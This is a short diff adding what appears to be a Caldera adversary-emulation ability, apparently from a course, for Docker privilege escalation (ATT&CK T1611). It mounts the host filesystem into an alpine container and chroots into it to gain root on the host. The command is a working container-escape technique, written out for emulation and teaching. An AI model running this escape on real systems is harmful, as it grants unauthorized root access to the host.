@@ -1,0 +1,16 @@
+ability_id: "e5e15b86-6d61-4ccc-bed9-02270ba207b2"
+tactic: "privilege-escalation"
+technique_name: "Exploit Docker for Root Access"
+technique_id: "T1611"
+name: "INF808 - Docker Privilege Escalation"
+description: "Exploite Docker pour obtenir un shell root sur le système hôte"
+executors:
+  - name: "sh"
+    platform: "linux"
+    command: "docker run -v /:/mnt alpine sh -c 'chroot /mnt whoami'"
+    timeout: 60
+requirements: []
+privilege: ""
+repeatable: false
+buckets: ["privilege-escalation"]
+delete_payload: true
